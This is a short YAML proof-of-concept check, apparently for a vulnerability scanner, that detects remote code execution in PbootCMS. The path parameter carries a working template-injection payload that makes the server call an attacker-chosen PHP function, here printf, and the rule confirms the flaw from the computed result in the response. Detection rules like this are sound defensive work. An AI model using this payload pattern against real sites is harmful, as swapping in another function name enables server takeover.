name: poc-yaml-pbootcms-rce
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
rules:
  - method: GET
    path: >-
      /index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a({{r1}}*{{r2}});//)})}}{/pboot:if}&b=printf
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
detail:
  author: Cannae(github.com/thunderbarca)
  links:
    - https://www.anquanke.com/post/id/167138
